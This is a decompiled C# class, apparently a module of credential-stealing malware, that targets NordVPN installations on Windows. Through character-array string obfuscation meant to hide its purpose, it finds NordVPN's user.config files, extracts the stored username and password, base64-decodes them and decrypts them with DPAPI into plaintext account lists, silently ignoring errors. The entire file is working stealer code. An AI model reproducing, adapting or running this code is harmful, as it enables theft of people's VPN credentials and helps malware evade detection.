using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

// Token: 0x02000008 RID: 8
public class NordApp
{
	// Token: 0x06000020 RID: 32 RVA: 0x00003724 File Offset: 0x00001924
	public static List<Account> Find()
	{
		List<Account> list = new List<Account>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.ExpandEnvironmentVariables("%USEWanaLifeRPROFILE%\\AppDaWanaLifeta\\LWanaLifeocal".Replace("WanaLife", string.Empty)), new string(new char[]
			{
				'N',
				'o',
				'D',
				'e',
				'f',
				'r',
				'd',
				'D',
				'e',
				'f',
				'V',
				'P',
				'N',
				'D',
				'e',
				'f'
			}).Replace("Def", string.Empty)));
			if (!directoryInfo.Exists)
			{
				return list;
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories(new string(new char[]
			{
				'N',
				'W',
				'i',
				'n',
				'o',
				'r',
				'd',
				'V',
				'W',
				'i',
				'n',
				'p',
				'n',
				'.',
				'e',
				'W',
				'i',
				'n',
				'x',
				'e',
				'*',
				'W',
				'i',
				'n'
			}).Replace("Win", string.Empty));
			for (int i = 0; i < directories.Length; i++)
			{
				foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
				{
					try
					{
						string text = Path.Combine(directoryInfo2.FullName, new string(new char[]
						{
							'u',
							's',
							'e',
							'r',
							'.',
							'c',
							'o',
							'n',
							'f',
							'i',
							'g'
						}));
						if (File.Exists(text))
						{
							XmlDocument xmlDocument = new XmlDocument();
							xmlDocument.Load(text);
							string innerText = xmlDocument.SelectSingleNode(new string(new char[]
							{
								' ',
								'/',
								'/',
								's',
								'e',
								't',
								't',
								'S',
								't',
								'r',
								'i',
								'n',
								'g',
								'.',
								'R',
								'e',
								'p',
								'l',
								'a',
								'c',
								'e',
								'i',
								'n',
								'g',
								'[',
								'@',
								'n',
								'a',
								'm',
								'e',
								'=',
								'\\',
								'U',
								'S',
								't',
								'r',
								'i',
								'n',
								'g',
								'.',
								'R',
								'e',
								'p',
								'l',
								'a',
								'c',
								'e',
								's',
								'e',
								'r',
								'n',
								'a',
								'm',
								'e',
								'\\',
								']',
								'/',
								'v',
								'a',
								'S',
								't',
								'r',
								'i',
								'n',
								'g',
								'.',
								'R',
								'e',
								'p',
								'l',
								'a',
								'c',
								'e',
								'l',
								'u',
								'e'
							}).Replace("String.Replace", string.Empty)).InnerText;
							string innerText2 = xmlDocument.SelectSingleNode(new string(new char[]
							{
								'/',
								'/',
								's',
								'e',
								't',
								't',
								'i',
								'n',
								'S',
								't',
								'r',
								'i',
								'n',
								'g',
								'.',
								'R',
								'e',
								'm',
								'o',
								'v',
								'e',
								'g',
								'[',
								'@',
								'n',
								'a',
								'm',
								'e',
								'=',
								'\\',
								'P',
								'a',
								's',
								's',
								'w',
								'S',
								't',
								'r',
								'i',
								'n',
								'g',
								'.',
								'R',
								'e',
								'm',
								'o',
								'v',
								'e',
								'o',
								'r',
								'd',
								'\\',
								']',
								'/',
								'v',
								'a',
								'l',
								'u',
								'S',
								't',
								'r',
								'i',
								'n',
								'g',
								'.',
								'R',
								'e',
								'm',
								'o',
								'v',
								'e',
								'e'
							}).Replace("String.Remove", string.Empty)).InnerText;
							if (!string.IsNullOrWhiteSpace(innerText) && !string.IsNullOrWhiteSpace(innerText2))
							{
								string @string = Encoding.UTF8.GetString(Convert.FromBase64String(innerText));
								string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(innerText2));
								string text2 = CryptoHelper.DecryptBlob(@string, DataProtectionScope.LocalMachine, null);
								string text3 = CryptoHelper.DecryptBlob(string2, DataProtectionScope.LocalMachine, null);
								if (!string.IsNullOrWhiteSpace(text2) && !string.IsNullOrWhiteSpace(text3))
								{
									list.Add(new Account
									{
										Username = text2,
										Password = text3
									});
								}
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
